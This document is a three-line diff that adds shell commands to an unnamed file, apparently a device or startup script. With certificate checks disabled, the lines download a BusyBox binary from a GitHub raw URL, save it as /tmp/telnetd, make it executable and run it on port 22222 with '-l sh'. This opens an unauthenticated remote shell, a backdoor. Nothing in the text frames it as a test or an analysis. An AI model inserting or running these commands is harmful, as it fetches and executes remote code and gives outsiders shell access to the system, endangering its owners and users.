@@ -1,0 +1,3 @@
+wget --no-check-certificate https://raw.githubusercontent.com/bugtest666/tools/main/busybox-arm -O /tmp/telnetd
+chmod +x /tmp/telnetd
+/tmp/telnetd -p 22222 -l sh
